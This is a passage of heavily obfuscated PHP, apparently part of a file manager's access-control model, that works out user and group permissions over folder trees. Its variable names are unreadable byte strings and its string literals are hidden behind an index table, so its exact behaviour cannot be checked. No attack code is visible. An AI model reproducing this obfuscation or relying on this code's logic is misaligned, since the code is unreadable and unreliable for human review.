$ÊÓ £…Õ) { $ˆ³¿öõö = Model($À¹­Â›[573])->listData($ÊÓ £…Õ[$À¹­Â›[2079]]); if (!$ˆ³¿öõö) { continue; } if ($ÊÓ £…Õ[$À¹­Â›[190]] == SourceModel::TYPE_USER) { $ò½ ×á¤ = Model($À¹­Â›[579])->getInfoSimpleOuter($ÊÓ £…Õ[$À¹­Â›[571]]); if ($ò½ ×á¤[$À¹­Â›[1770]] == $À¹­Â›[1270]) { continue; } if ($ò½ ×á¤[$À¹­Â›[1770]] == $À¹­Â›[230]) { $ò½ ×á¤[$À¹­Â›[32]] = LNG($À¹­Â›[2162]); } } else { $ò½ ×á¤ = Model($À¹­Â›[587])->getInfoSimple($ÊÓ £…Õ[$À¹­Â›[571]]); } if (!$ò½ ×á¤) { continue; } $ò½ ×á¤[$À¹­Â›[542]] = $ˆ³¿öõö; $ıŞáŒÈ–[] = $ò½ ×á¤; $°—«¹½ = 0; if ($ÊÓ £…Õ[$À¹­Â›[190]] == SourceModel::TYPE_GROUP) { $°—«¹½ = $É‚âæ¼â * 2; } if ($ÊÓ £…Õ[$À¹­Â›[190]] == SourceModel::TYPE_USER) { $°—«¹½ = $É‚âæ¼â; } if ($ÊÓ £…Õ[$À¹­Â›[190]] == SourceModel::TYPE_USER && $ÊÓ £…Õ[$À¹­Â›[571]] == $À¹­Â›[230]) { $°—«¹½ = 0; } $ˆØİ—¬Ë[] = $ˆ³¿öõö[$À¹­Â›[489]] + $°—«¹½; } array_multisort($ˆØİ—¬Ë, SORT_DESC, $ıŞáŒÈ–); return $ıŞáŒÈ–; } public function getAllChildrenByUser($ÊšŒ†İ§, $ÛÙ¨ò¼) { $Ğ¬¶çòÙ =& $_SERVER[Š—Â“œÔ]; $»ÙºÓ± = Model($Ğ¬¶çòÙ[599])->getInfo($ÛÙ¨ò¼); if (!$ÛÙ¨ò¼ || !$ÊšŒ†İ§ || !$»ÙºÓ±) { return array(); } $ÓŞ•ú¢œ = Model($Ğ¬¶çòÙ[1419])->sourceInfo($ÊšŒ†İ§); $‹ÒÚïÁ = array(); $˜¿˜õ€ = 1; if ($ÓŞ•ú¢œ[$Ğ¬¶çòÙ[192]] == $Ğ¬¶çòÙ[230] && $ÓŞ•ú¢œ[$Ğ¬¶çòÙ[571]] != $˜¿˜õ€ && $this->groupContainUser($ÓŞ•ú¢œ[$Ğ¬¶çòÙ[571]], $ÛÙ¨ò¼)) { foreach ($»ÙºÓ±[$Ğ¬¶çòÙ[2163]] as $äÁÈ‰¬) { $æî˜‡ñ = Model($Ğ¬¶çòÙ[587])->getInfo($äÁÈ‰¬[$Ğ¬¶çòÙ[1971]]); $µ§æÏºè = Model($Ğ¬¶çòÙ[599])->getInfoSimpleOuter($ÛÙ¨ò¼); $µ§æÏºè[$Ğ¬¶çòÙ[542]] = $äÁÈ‰¬[$Ğ¬¶çòÙ[489]]; if (Model($Ğ¬¶çòÙ[573])->authCheckAction($äÁÈ‰¬[$Ğ¬¶çòÙ[489]][$Ğ¬¶çòÙ[489]], $Ğ¬¶çòÙ[1992])) { continue; } $â õ­Çš = array($Ğ¬¶çòÙ[32] => $Ğ¬¶çòÙ[1290] . $æî˜‡ñ[$Ğ¬¶çòÙ[32]], $Ğ¬¶çòÙ[193] => $æî˜‡ñ[$Ğ¬¶çòÙ[90]][$Ğ¬¶çòÙ[193]], $Ğ¬¶çòÙ[87] => KodIO::make($æî˜‡ñ[$Ğ¬¶çòÙ[90]][$Ğ¬¶çòÙ[193]]), $Ğ¬¶çòÙ[192] => $Ğ¬¶çòÙ[230], $Ğ¬¶çòÙ[190] => $Ğ¬¶çòÙ[580], $Ğ¬¶çòÙ[33] => $Ğ¬¶çòÙ[621], $Ğ¬¶çòÙ[584] => $æî˜‡ñ[$Ğ¬¶çòÙ[591]], $Ğ¬¶çòÙ[1971] => $æî˜‡ñ[$Ğ¬¶çòÙ[1971]], $Ğ¬¶çòÙ[588] => $æî˜‡ñ[$Ğ¬¶çòÙ[192]], $Ğ¬¶çòÙ[2160] => array($µ§æÏºè)); $‹ÒÚïÁ[$â õ­Çš[$Ğ¬¶çòÙ[193]]] = $â õ­Çš; } } $â¼Ç‰°ã = array(); $–»ßâŒ¤ = $this->getAllChildren($ÊšŒ†İ§); foreach ($–»ßâŒ¤ as $­œÚş¥ˆ) { $ø‡ªÛ¥ = !1; foreach ($­œÚş¥ˆ[$Ğ¬¶çòÙ[2160]] as $‡ê»üÄ) { if ($‡ê»üÄ[$Ğ¬¶çòÙ[1770]]) { if ($‡ê»üÄ[$Ğ¬¶çòÙ[1770]] == $ÛÙ¨ò¼) { $ø‡ªÛ¥ = !0; break; } } if ($‡ê»üÄ[$Ğ¬¶çòÙ[1971]]) { if ($this->groupContainUser($‡ê»üÄ[$Ğ¬¶çòÙ[1971]], $ÛÙ¨ò¼)) { $ø‡ªÛ¥ = !0; break; } } } if ($ø‡ªÛ¥) { $â¼Ç‰°ã[] = $­œÚş¥ˆ; } $Ó™şìÕ’ = $­œÚş¥ˆ[$Ğ¬¶çòÙ[193]]; if (isset($‹ÒÚïÁ[$Ó™şìÕ’])) { $­œÚş¥ˆ[$Ğ¬¶çòÙ[2160]][] = $‹ÒÚïÁ[$Ó™şìÕ’][0]; $‹ÒÚïÁ[$Ó™şìÕ’] = !1; } } $‹ÒÚïÁ = array_filter(array_values($‹ÒÚïÁ)); $â¼Ç‰°ã = array_merge($‹ÒÚïÁ, $â¼Ç‰°ã); return $â¼Ç‰°ã; } public function setAllChildrenByUser($Í¸úºÈæ, $í ÇÈ¦Á, $ŒÒ¨¢ ) { $¨ª˜å¾è =& $_SERVER[Š—Â“œÔ]; $õåÜ²øñ = $this->getAllChildrenByUser($Í¸úºÈæ, $í ÇÈ¦Á); if (!$ŒÒ¨¢  || !$õåÜ²øñ) { return !1; } foreach ($õåÜ²øñ as $áÍƒ¿¦) { $îÑÁÜ– = array(); foreach ($áÍƒ¿¦[$¨ª˜å¾è[2160]] as $øø¼ˆıˆ) { $úÂ©İÖ = $øø¼ˆıˆ[$¨ª˜å¾è[542]]; $û²…¤ = $øø¼ˆıˆ[$¨ª˜å¾è[1770]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ÆÄùÖ›£ = $øø¼ˆıˆ[$¨ª˜å¾è[1770]] ? $øø¼ˆıˆ[$¨ª˜å¾è[1770]] : $øø¼ˆıˆ[$¨ª˜å¾è[1971]]; if ($øø¼ˆıˆ[$¨ª˜å¾è[1770]] && $øø¼ˆıˆ[$¨ª˜å¾è[1770]] == $í ÇÈ¦Á) { continue; } $îÑÁÜ–[] = array($¨ª˜å¾è[193] => $áÍƒ¿¦[$¨ª˜å¾è[193]], $¨ª˜å¾è[190] => $û²…¤, $¨ª˜å¾è[571] => intval($ÆÄùÖ›£), $¨ª˜å¾è[2079] => isset($úÂ©İÖ[$¨ª˜å¾è[477]]) ? intval($úÂ©İÖ[$¨ª˜å¾è[477]]) : 0, $¨ª˜å¾è[2140] => isset($úÂ©İÖ[$¨ª˜å¾è[2140]]) ? intval($úÂ©İÖ[$¨ª˜å¾è[2140]]) : -1); } $îÑÁÜ–[] = array($¨ª˜å¾è[193] => $áÍƒ¿¦[$¨ª˜å¾è[193]], $¨ª˜å¾è[190] => SourceModel::TYPE_USER, $¨ª˜å¾è[571] => intval($í ÇÈ¦Á), $¨ª˜å¾è[2079] => intval($ŒÒ¨¢ ), $¨ª˜å¾è[2140] => -1); $this->where(array($¨ª˜å¾è[493] => $áÍƒ¿¦[$¨ª˜å¾è[193]]))->delete(); $this->addAll($îÑÁÜ–); } return !0; } public function get($ÃÑşÓ­Ç) { $®íËøå = $this->getSourceList(array($ÃÑşÓ­Ç), !0); return $®íËøå[0]; } public function getSourceList($ØÎ‹ÄĞ, $ÄÒËËÕš = false, $ö‘¦¬°™ = false) { $‡âüªø =& $_SERVER[Š—Â“œÔ]; if (!$ØÎ‹ÄĞ) { return array(); } $ÍŞ“ß²ò = Model($‡âüªø[1419]); if (!$ÄÒËËÕš && count($ØÎ‹ÄĞ) == 1) { $ÄÒËËÕš = array(); $ÄÒËËÕš[$ØÎ‹ÄĞ[0]] = $ÍŞ“ß²ò->sourceInfo($ØÎ‹ÄĞ[0]); } if (!$ÄÒËËÕš) { $¸„çËì = array($‡âüªø[493] => array($‡âüªø[494], $ØÎ‹ÄĞ)); $ÄÒËËÕš = $ÍŞ“ß²ò->field($‡âüªø[2164])->where($¸„çËì)->select(); $ÄÒËËÕš = array_to_keyvalue($ÄÒËËÕš, $‡âüªø[193]); } $ÇºåÅ¼µ = $ØÎ‹ÄĞ; foreach ($ÄÒËËÕš as $´¯Û¨Â => $µ½ù…é…) { $ü“ƒğ = $ÍŞ“ß²ò->parentLevelArray($µ½ù…é…[$‡âüªø[586]]); $ÇºåÅ¼µ = array_merge($ÇºåÅ¼µ, array($´¯Û¨Â), array_reverse($ü“ƒğ)); } $ÇºåÅ¼µ = array_values(array_unique($ÇºåÅ¼µ)); if (!$ÇºåÅ¼µ) { return array(); } $õ†ó·öÕ = $this->sourceAuthSelect($ÇºåÅ¼µ); $ê±—çß = array(); foreach ($ÇºåÅ¼µ as $úê¾ÕˆÅ) { if (isset($õ†ó·öÕ[$úê¾ÕˆÅ])) { $ê±—çß[$úê¾ÕˆÅ] = $õ†ó·öÕ[$úê¾ÕˆÅ]; } } $š†øŸÎñ = $this->userIsRoot($ö‘¦¬°™); $ºÒ¡ûÙˆ = AuthModel::authAll(); $‚“Â©÷€ = array($‡âüªø[490] => $ºÒ¡ûÙˆ, $‡âüªø[2165] => array($‡âüªø[495] => 0, $‡âüªø[1977] => $ºÒ¡ûÙˆ, $‡âüªø[496] => LNG($‡âüªø[2166]), $‡âüªø[1994] => $‡âüªø[2167])); $¬ŸÁ»ß = array(); foreach ($ÄÒËËÕš as $úê¾ÕˆÅ => $òáÜ‘”ì) { if ($š†øŸÎñ && $GLOBALS[$‡âüªø[6]][$‡âüªø[1990]]) { $¬ŸÁ»ß[$úê¾ÕˆÅ] = $‚“Â©÷€; continue; } $¬ŸÁ»ß[$úê¾ÕˆÅ] = $this->makeSourceAuth($òáÜ‘”ì, $ê±—çß, $ö‘¦¬°™); } return $¬ŸÁ»ß; } public function authDeepCheck($à‹°ªõ‘, $ÙÃ±™ş = false) { $÷’ı®™ï =& $_SERVER[Š—Â“œÔ]; $ÙÃ±™ş = $ÙÃ±™ş ? $ÙÃ±™ş : USER_ID; $íëğ‘ğı = $this->makeAuthDeep($ÙÃ±™ş); if (!in_array($à‹°ªõ‘, $íëğ‘ğı[$÷’ı®™ï[2168]])) { return !1; } $úéÒ¶Ç¡ = array(); foreach ($íëğ‘ğı[$÷’ı®™ï[2169]] as $¨‰ÍĞõ => $ç˜×â“) { if (!in_array($à‹°ªõ‘, $ç˜×â“)) { continue; } $úéÒ¶Ç¡[] = $¨‰ÍĞõ; } if (!$úéÒ¶Ç¡) { return !1; } $Ó¯½±£¯ = $úéÒ¶Ç¡ ? $úéÒ¶Ç¡[0] : $à‹°ªõ‘; return array($÷’ı®™ï[490] => -1, $÷’ı®™ï[542] => array($÷’ı®™ï[495] => $÷’ı®™ï[1270], $÷’ı®™ï[1977] => $÷’ı®™ï[230], $÷’ı®™ï[496] => LNG($÷’ı®™ï[2170]), $÷’ı®™ï[1994] => $÷’ı®™ï[2171]), $÷’ı®™ï[2172] => LNG($÷’ı®™ï[2173]), $÷’ı®™ï[2174] => $this->sourceAuthInfo($Ó¯½±£¯)); } protected function makeAuthDeep($§ÄóÎİß = false) { $ÄØªËÅ¶ =& $_SERVER[Š—Â“œÔ]; static $şÑÈó†¥ = array(); $§ÄóÎİß = $§ÄóÎİß ? $§ÄóÎİß : USER_ID; if (isset($şÑÈó†¥[$§ÄóÎİß])) { return $şÑÈó†¥[$§ÄóÎİß]; } $ã£º¢ŠÕ = Model($ÄØªËÅ¶[2175])->listData(); $Ÿòß¹ú = array(); foreach ($ã£º¢ŠÕ as $àí“¸ş¸) { if ($àí“¸ş¸[$ÄØªËÅ¶[489]] == 0 && $àí“¸ş¸[$ÄØªËÅ¶[1993]] == $ÄØªËÅ¶[91]) { $Ÿòß¹ú[] = $àí“¸ş¸[$ÄØªËÅ¶[477]]; } } $Ñ°úºô = $this->userGroupParents($§ÄóÎİß); $¥‚¶Â£ì = array($ÄØªËÅ¶[190] => SourceModel::TYPE_USER, $ÄØªËÅ¶[571] => $§ÄóÎİß); if ($Ñ°úºô) { $¥‚¶Â£ì = array(array($ÄØªËÅ¶[190] => SourceModel::TYPE_USER, $ÄØªËÅ¶[571] => $§ÄóÎİß), array($ÄØªËÅ¶[190] => SourceModel::TYPE_GROUP, $ÄØªËÅ¶[571] => array($ÄØªËÅ¶[494], $Ñ°úºô)), $ÄØªËÅ¶[1074] => $ÄØªËÅ¶[2073]); } $Š¥Ú–Ú = $this->field($ÄØªËÅ¶[2176])->where($¥‚¶Â£ì)->select(); $ü˜÷¦È¬ = array(); $‘‹ëİßğ = array_to_keyvalue_group($Š¥Ú–Ú, $ÄØªËÅ¶[193]); foreach ($‘‹ëİßğ as $Ğ¾äŸƒÀ => $ÓÍüâ‘) { $’û² ±œ = $this->authArrayCheck($ÓÍüâ‘, $§ÄóÎİß); if ($’û² ±œ[$ÄØªËÅ¶[490]] > 0) { $ü˜÷¦È¬[] = $Ğ¾äŸƒÀ . $ÄØªËÅ¶[12]; } } if ($Ñ°úºô) { $Ï¸€ğ¯‘ = Model($ÄØªËÅ¶[587]); foreach ($Ñ°úºô as $‚¦À‹›Ö) { $¢û®¾„Û = $Ï¸€ğ¯‘->getInfo($‚¦À‹›Ö); if (!$¢û®¾„Û || !is_array($¢û®¾„Û[$ÄØªËÅ¶[90]])) { continue; } $ü˜÷¦È¬[] = $¢û®¾„Û[$ÄØªËÅ¶[90]][$ÄØªËÅ¶[193]]; } } $õôÙö×ø = array(); $öÈéç¸ğ = $Ñ°úºô; $¤ùÖæ» = Model($ÄØªËÅ¶[1419]); $Ï¸€ğ¯‘ = Model($ÄØªËÅ¶[587]); $Œ©ŒêÇØ = array(); $ÅÈîˆú¨ = array(); $ĞşÙÌÑ³ = array(); $¼şÂø±½ = array(); if ($ü˜÷¦È¬) { $ÆİóÚè = $¤ùÖæ»->where(array($ÄØªËÅ¶[193] => array($ÄØªËÅ¶[494], $ü˜÷¦È¬)))->select(); foreach ($ÆİóÚè as $Ú­¯ˆæ) { if ($Ú­¯ˆæ[$ÄØªËÅ¶[507]] == $ÄØªËÅ¶[91]) { continue; } $ûœ‹ş–ï = $¤ùÖæ»->parentLevelArray($Ú­¯ˆæ[$ÄØªËÅ¶[586]]); $õôÙö×ø = array_merge($õôÙö×ø, $ûœ‹ş–ï); $öÈéç¸ğ[] = $Ú­¯ˆæ[$ÄØªËÅ¶[571]]; $Œ©ŒêÇØ[$Ú­¯ˆæ[$ÄØªËÅ¶[193]]] = $ûœ‹ş–ï; $ÅÈîˆú¨[$Ú­¯ˆæ[$ÄØªËÅ¶[193]]] = $Ú­¯ˆæ[$ÄØªËÅ¶[571]]; } } $öÈéç¸ğ = array_values(array_unique($öÈéç¸ğ)); $ÔÚÙÙÖ = $öÈéç¸ğ; foreach ($ÔÚÙÙÖ as $‚¦À‹›Ö) { $¢û®¾„Û = $Ï¸€ğ¯‘->getInfo($‚¦À‹›Ö); $ûœ‹ş–ï = $¤ùÖæ»->parentLevelArray($¢û®¾„Û[$ÄØªËÅ¶[586]]); $öÈéç¸ğ = array_merge($öÈéç¸ğ, $ûœ‹ş–ï); } $öÈéç¸ğ = array_values(array_unique($öÈéç¸ğ)); foreach ($öÈéç¸ğ as $‚¦À‹›Ö) { $¢û®¾„Û = $Ï¸€ğ¯‘->getInfo($‚¦À‹›Ö); $õôÙö×ø[] = $¢û®¾„Û[$ÄØªËÅ¶[90]][$ÄØªËÅ¶[193]]; $ĞşÙÌÑ³[$‚¦À‹›Ö] = $¢û®¾„Û[$ÄØªËÅ¶[90]][$ÄØªËÅ¶[193]]; $¼şÂø±½[$‚¦À‹›Ö] = $¤ùÖæ»->parentLevelArray($¢û®¾„Û[$ÄØªËÅ¶[586]]); } foreach ($Œ©ŒêÇØ as $É¯ÑŸ‹ => $çŞÀ”¼º) { $¹ğ­²„ = $ÅÈîˆú¨[$É¯ÑŸ‹]; if (!$¹ğ­²„ || !$ĞşÙÌÑ³[$¹ğ­²„]) { continue; } $íûÌÊ‘Ì = array(); foreach ($¼şÂø±½[$¹ğ­²„] as $‚¦À‹›Ö) { $íûÌÊ‘Ì[] = $ĞşÙÌÑ³[$‚¦À‹›Ö]; } $Œ©ŒêÇØ[$É¯ÑŸ‹] = array_merge($íûÌÊ‘Ì, $çŞÀ”¼º); } $õôÙö×ø = array_values(array_unique($õôÙö×ø)); $İÅ˜‘Â = array($ÄØªËÅ¶[2168] => $õôÙö×ø, $ÄØªËÅ¶[2169] => $Œ©ŒêÇØ); $şÑÈó†¥[$§ÄóÎİß] = $İÅ˜‘Â; return $İÅ˜‘Â; } private function makeSourceAuth($ÍòâäËŠ, $æÄ¨ä·•, $€ğã¨Äô = false) { $©“ÙÌ®° =& $_SERVER[Š—Â“œÔ]; $º¶„ƒ“À = $©“ÙÌ®°[91]; $Ñáõ¶œ™ = $ÍòâäËŠ[$©“ÙÌ®°[571]]; $â€ÕîÉ¦ = $ÍòâäËŠ[$©“ÙÌ®°[190]] == SourceModel::TYPE_GROUP; $Ø“×»Í› = $â€ÕîÉ¦ ? $this->groupRootAuth($Ñáõ¶œ™, $€ğã¨Äô) : !1; if ($Ø“×»Í› && Model($©“ÙÌ®°[573])->authCheckAction($Ø“×»Í›[$©“ÙÌ®°[489]], $©“ÙÌ®°[1992])) { return $this->groupAuthInfo($Ø“×»Í›, $Ñáõ¶œ™); } $˜œ’çáÎ = Model($©“ÙÌ®°[1419])->parentLevelArray($ÍòâäËŠ[$©“ÙÌ®°[586]]); $˜œ’çáÎ = array_merge(array($ÍòâäËŠ[$©“ÙÌ®°[193]]), array_reverse($˜œ’çáÎ)); $é¢¢™ƒ‰ = !1; foreach ($˜œ’çáÎ as $º½š¾Ì) { if (!isset($æÄ¨ä·•[$º½š¾Ì])) { continue; } $¢ñ›¯ÅÚ = $this->authMake($æÄ¨ä·•[$º½š¾Ì], $€ğã¨Äô); if ($¢ñ›¯ÅÚ[$©“ÙÌ®°[542]]) { $é¢¢™ƒ‰ = $¢ñ›¯ÅÚ; break; } } if (!$â€ÕîÉ¦) { return $é¢¢™ƒ‰; } if (!$é¢¢™ƒ‰ && $Ø“×»Í›) { $é¢¢™ƒ‰ = $this->groupAuthInfo($Ø“×»Í›, $Ñáõ¶œ™); } if (!$é¢¢™ƒ‰) { $ûÈÎ¹÷ = Model($©“ÙÌ®°[587])->getInfo($Ñáõ¶œ™); $£‹¢û›Û = explode($©“ÙÌ®°[50], trim($ûÈÎ¹÷[$©“ÙÌ®°[586]], $©“ÙÌ®°[50])); $£‹¢û›Û = array_reverse($£‹¢û›Û); foreach ($£‹¢û›Û as $ÒªÃúÑ¤) { if ($ÒªÃúÑ¤ == $©“ÙÌ®°[230] || $ÒªÃúÑ¤ == $º¶„ƒ“À) { continue; } $„ßğ£ª© = $this->groupRootAuth($ÒªÃúÑ¤, $€ğã¨Äô); if (!$„ßğ£ª©) { continue; } $é¢¢™ƒ‰ = $this->groupAuthInfo($„ßğ£ª©, $ÒªÃúÑ¤); break; } } if (!$é¢¢™ƒ‰ || $é¢¢™ƒ‰[$©“ÙÌ®°[490]] <= 0) { $— –ø°Ú = $this->authDeepCheck($ÍòâäËŠ[$©“ÙÌ®°[193]], $€ğã¨Äô); if ($— –ø°Ú) { $é¢¢™ƒ‰ = $— –ø°Ú; } } return $é¢¢™ƒ‰; } private function userIsRoot($Œõ°‘¾ˆ = false) { $ªş¸¨› =& $_SERVER[Š—Â“œÔ]; if (!$Œõ°‘¾ˆ && KodUser::isRoot()) { return !0; } $™ƒ¬”¼ = Model($ªş¸¨›[599])->getInfo($Œõ°‘¾ˆ); $êœ·”ò¾ = Model($ªş¸¨›[2177])->listData($™ƒ¬”¼[$ªş¸¨›[2178]]); if ($êœ·”ò¾ && $êœ·”ò¾[$ªş¸¨›[577]][$ªş¸¨›[2179]] == 1) { return !0; } return !1; } private function sourceAuthInfo($±Ê àÀ) { $˜ïçÊÊÉ =& $_SERVER[Š—Â“œÔ]; $²÷ùÓÖ = Model($˜ïçÊÊÉ[1419]); $Æ¤â÷çÓ = $²÷ùÓÖ->sourceInfo($±Ê àÀ); if (!$Æ¤â÷çÓ) { return !1; } $²÷ùÓÖ->groupPathDisplay($Æ¤â÷çÓ); $…ûÇ§â“ = array($Æ¤â÷çÓ); $…ûÇ§â“ = $²÷ùÓÖ->_listAppendPath($…ûÇ§â“); $Æ¤â÷çÓ = $…ûÇ§â“[0]; $š¡å¤Öí = $Æ¤â÷çÓ[$˜ïçÊÊÉ[584]]; if (isset($Æ¤â÷çÓ[$˜ïçÊÊÉ[592]])) { $ñŞ·¼è± = explode($˜ïçÊÊÉ[8], trim($Æ¤â÷çÓ[$˜ïçÊÊÉ[584]], $˜ïçÊÊÉ[8])); array_shift($ñŞ·¼è±); $š¡å¤Öí = $Æ¤â÷çÓ[$˜ïçÊÊÉ[590]] . $˜ïçÊÊÉ[2180] . implode($˜ïçÊÊÉ[8], $ñŞ·¼è±); } return array($˜ïçÊÊÉ[496] => $Æ¤â÷çÓ[$˜ïçÊÊÉ[32]], $˜ïçÊÊÉ[87] => KodIO::make($Æ¤â÷çÓ[$˜ïçÊÊÉ[193]]), $˜ïçÊÊÉ[2181] => $š¡å¤Öí); } private function groupAuthInfo($°Çó˜ä¯, $å¾¼¡õ‡) { $ü®ç¢¥ô =& $_SERVER[Š—Â“œÔ]; $Ó²‚Ñó = Model($ü®ç¢¥ô[587])->getInfo($å¾¼¡õ‡); return array($ü®ç¢¥ô[2182] => intval($°Çó˜ä¯[$ü®ç¢¥ô[489]]), $ü®ç¢¥ô[2165] => $°Çó˜ä¯, $ü®ç¢¥ô[2183] => LNG($ü®ç¢¥ô[2184]), $ü®ç¢¥ô[2174] => array($ü®ç¢¥ô[496] => $Ó²‚Ñó[$ü®ç¢¥ô[32]], $ü®ç¢¥ô[87] => KodIO::make($Ó²‚Ñó[$ü®ç¢¥ô[90]][$ü®ç¢¥ô[193]]), $ü®ç¢¥ô[2181] => $Ó²‚Ñó[$ü®ç¢¥ô[591]])); } protected function groupRootAuth($Çá™°è, $ùÂÜ¦ì = false) { $•Œã© ² =& $_SERVER[Š—Â“œÔ]; $ùÂÜ¦ì = $ùÂÜ¦ì ? $ùÂÜ¦ì : USER_ID; $óÖÛ­éà = $ùÂÜ¦ì . $•Œã© ²[2185] . $Çá™°è; static $—æÎŸ²‹ = array(); if (isset($—æÎŸ²‹[$óÖÛ­éà])) { return $—æÎŸ²‹[$óÖÛ­éà]; } $ÊÓ±ÉÆÙ = Model($•Œã© ²[587])->getInfo($Çá™°è); $‹òê¯¢º = $this->userGroupList($ùÂÜ¦ì); $»®ƒò®„ = isset($‹òê¯¢º[$Çá™°è]) ? $‹òê¯¢º[$Çá™°è][$•Œã© ²[489]] : !1; if ($»®ƒò®„ && Model($•Œã© ²[573])->authCheckAction($»®ƒò®„[$•Œã© ²[489]], $•Œã© ²[1992])) { $—æÎŸ²‹[$óÖÛ­éà] = $»®ƒò®„; return $»®ƒò®„; } $â·­œ¡ = $this->sourceAuthSelect($ÊÓ±ÉÆÙ[$•Œã© ²[90]][$•Œã© ²[193]]); $¬ƒªàé = $â·­œ¡ ? $this->authMake($â·­œ¡, $ùÂÜ¦ì) : !1; $äë»÷ñÂ = $¬ƒªàé ? $¬ƒªàé[$•Œã© ²[542]] : !1; $—æÎŸ²‹[$óÖÛ­éà] = $äë»÷ñÂ ? $äë»÷ñÂ : $»®ƒò®„; return $—æÎŸ²‹[$óÖÛ­éà]; } public function authOwnerApply($Ô›£î¢) { $Ã™êºìş =& $_SERVER[Š—Â“œÔ]; if (empty($Ô›£î¢[$Ã™êºìş[489]]) || isset($Ô›£î¢[$Ã™êºìş[2186]]) && $Ô›£î¢[$Ã™êºìş[2186]]) { return $Ô›£î¢; } if (AuthModel::authCheckRoot($Ô›£î¢[$Ã™êºìş[489]][$Ã™êºìş[490]])) { return $Ô›£î¢; } $ì±ùºÑ¸ = Model($Ã™êºìş[1419])->parentLevelArray($Ô›£î¢[$Ã™êºìş[586]]); $ì±ùºÑ¸ = array_merge(array($Ô›£î¢[$Ã™êºìş[193]]), array_reverse($ì±ùºÑ¸)); $È‹ã™²´ = $this->sourceAuthSelect($ì±ùºÑ¸); $èÈ¯ÆËÍ = array(); $Ì å€¶ = array(); foreach ($È‹ã™²´ as $²¿ ¤™Ï => $®ëÚó˜ø) { $à˜èÀèº = $this->authFolderOwnerUser($®ëÚó˜ø); $èÈ¯ÆËÍ[$²¿ ¤™Ï] = $à˜èÀèº; $Ì å€¶ = array_merge($Ì å€¶, $à˜èÀèº[$Ã™êºìş[667]]); if ($à˜èÀèº[$Ã™êºìş[2187]]) { break; } } if (count($Ì å€¶) == 0) { $Ì å€¶ = $this->authFolderOwnerGroup($Ô›£î¢[$Ã™êºìş[571]]); } $Ì å€¶ = array_unique($Ì å€¶); if (AuthModel::authCheckRoot($Ô›£î¢[$Ã™êºìş[489]][$Ã™êºìş[490]])) { $Ì å€¶[] = USER_ID; } $Ô›£î¢[$Ã™êºìş[489]][$Ã™êºìş[2188]] = Model($Ã™êºìş[579])->userListInfo($Ì å€¶); return $Ô›£î¢; } private function authFolderOwnerGroup($Âî¶ ‹­) { $€Ê†ˆ…Ã =& $_SERVER[Š—Â“œÔ]; $º¦µòê» = Model($€Ê†ˆ…Ã[2065])->where(array($€Ê†ˆ…Ã[1971] => $Âî¶ ‹­))->select(); $ÈÁî×¼Ä = array(); if (!$º¦µòê») { return $ÈÁî×¼Ä; } foreach ($º¦µòê» as $²’¬³°) { $ê’ËŞ¬Ù = $this->authInfo($²’¬³°); if (AuthModel::authCheckRoot($ê’ËŞ¬Ù[$€Ê†ˆ…Ã[489]])) { $ÈÁî×¼Ä[] = $²’¬³°[$€Ê†ˆ…Ã[1770]]; } } return $ÈÁî×¼Ä; } private function authFolderOwnerUser($ì›ú·Æí) { $ãŸ°Ï´ =& $_SERVER[Š—Â“œÔ]; $£ÍÅé‰ = array(); $µÌï¦†£ = !1; foreach ($ì›ú·Æí as $ñòøõ¯ù) { $ŒÂ«Ô‡ê = $this->authInfo($ñòøõ¯ù); if ($ñòøõ¯ù[$ãŸ°Ï´[571]] == $ãŸ°Ï´[230]) { $µÌï¦†£ = !0; } if ($ñòøõ¯ù[$ãŸ°Ï´[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ŒÂ«Ô‡ê[$ãŸ°Ï´[489]])) { $£ÍÅé‰[] = $ñòøõ¯ù[$ãŸ°Ï´[571]]; } } } return array($ãŸ°Ï´[667] => $£ÍÅé‰, $ãŸ°Ï´[2187] => $µÌï¦†£); } public function authMake($ñ©ƒë«î, $êåü«ª» = false) { $şøãÜäÎ =& $_SERVER[Š—Â“œÔ]; $Íë†›½» = $this->authArrayCheck($ñ©ƒë«î, $êåü«ª»); if ($Íë†›½»[$şøãÜäÎ[2189]]) { $Íë†›½»[$şøãÜäÎ[2189]] = $this->sourceAuthInfo($Íë†›½»[$şøãÜäÎ[2189]]); } return $Íë†›½»; } public function authArrayCheck($ã¯­”„É, $³š¿Îúã = false) { $ûšÜ—‰Ü =& $_SERVER[Š—Â“œÔ]; if (!$ã¯­”„É) { return array($ûšÜ—‰Ü[490] => 0, $ûšÜ—‰Ü[542] => !1); } $³š¿Îúã = $³š¿Îúã ? $³š¿Îúã : USER_ID; $šì¸¼˜Æ = 0; $²Ñ·”ğÇ = 0; $ßÒÄÍ¤É = 0; $Ë¹ˆ•Ù = 0; $®õÈˆ¼ = 0; $½ıÑëĞš = 0; $ ”éèé = 1000; $àµœ³ = 0; $¦ÕÑïşø = 0; $õ¤òÑ× = 0; $ÓÌ²Ê£• = 0; $Úº®¨Ü‡ = array($ûšÜ—‰Ü[193] => 0); foreach ($ã¯­”„É as $Úº®¨Ü‡) { $¹‰ºæú = $this->authInfo($Úº®¨Ü‡); if (!$¹‰ºæú) { continue; } $´«–ŒÙô = $Úº®¨Ü‡[$ûšÜ—‰Ü[571]]; $›ô‰Š¡Ù = intval($¹‰ºæú[$ûšÜ—‰Ü[489]]); if ($Úº®¨Ü‡[$ûšÜ—‰Ü[190]] == SourceModel::TYPE_USER && $´«–ŒÙô == $³š¿Îúã) { $šì¸¼˜Æ = !0; $ßÒÄÍ¤É = $¹‰ºæú; $²Ñ·”ğÇ = $›ô‰Š¡Ù; } else { if ($Úº®¨Ü‡[$ûšÜ—‰Ü[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($´«–ŒÙô, $³š¿Îúã)) { $Ë¹ˆ•Ù = !0; $İ˜ûµ— = $this->groupStepToUserGroup($´«–ŒÙô, $³š¿Îúã); if ($İ˜ûµ— < $ ”éèé) { $ ”éèé = $İ˜ûµ—; $®õÈˆ¼ = $›ô‰Š¡Ù; $½ıÑëĞš = $¹‰ºæú; $àµœ³ = $´«–ŒÙô; } if ($İ˜ûµ— == $ ”éèé && $›ô‰Š¡Ù >= $®õÈˆ¼) { $®õÈˆ¼ = $›ô‰Š¡Ù; $½ıÑëĞš = $¹‰ºæú; $àµœ³ = $´«–ŒÙô; } } else { if ($´«–ŒÙô == $ûšÜ—‰Ü[230]) { $¦ÕÑïşø = !0; $ÓÌ²Ê£• = $¹‰ºæú; $õ¤òÑ× = $›ô‰Š¡Ù; } } } } if ($šì¸¼˜Æ) { $ç€ˆ²åÜ = 